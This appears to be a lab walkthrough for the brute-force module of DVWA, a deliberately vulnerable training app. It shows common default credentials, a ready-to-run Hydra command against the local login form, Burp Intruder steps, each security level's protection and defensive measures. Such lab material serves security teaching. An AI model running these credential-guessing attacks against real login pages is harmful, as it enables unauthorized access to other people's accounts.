# 🔓 Brute Force

## What is Brute Force?

Brute Force is an attack where the attacker tries many username/password combinations until the correct one is found. DVWA's brute force module is a simple login form with no rate limiting or lockout on the **Low** security level.

---

## How It Works

The login form sends a GET request like:

```
http://localhost/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login
```

On failure, the response contains: `Username and/or password incorrect.`
On success, the response contains: `Welcome to the password protected area`

---

## Manual Test

Try logging in with common credentials:

| Username | Password |
|----------|----------|
| admin    | password |
| admin    | admin    |
| admin    | 123456   |

---

## Attack with Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  "http-get-form://localhost/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=YOUR_SESSION_ID; security=low"
```

> Replace `YOUR_SESSION_ID` with your actual session cookie from the browser.

---

## Attack with Burp Suite

1. Open Burp Suite → Proxy → Intercept the login request
2. Send to **Intruder**
3. Mark the `password` field as payload position: `password=§test§`
4. Load a wordlist under **Payloads**
5. Start attack — look for a response with different length (successful login)

---

## Payloads

See [`payloads.txt`](./payloads.txt)

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No protection at all |
| Medium | `sleep(2)` added on failure — slows brute force |
| High | Anti-CSRF token added to form — Hydra won't work directly |
| Impossible | Account lockout after 3 failed attempts |

---

## How to Defend

- Implement account lockout after N failed attempts
- Add rate limiting (e.g., 1 request/second per IP)
- Use CAPTCHA on login forms
- Use multi-factor authentication (MFA)
- Log and alert on repeated failed logins
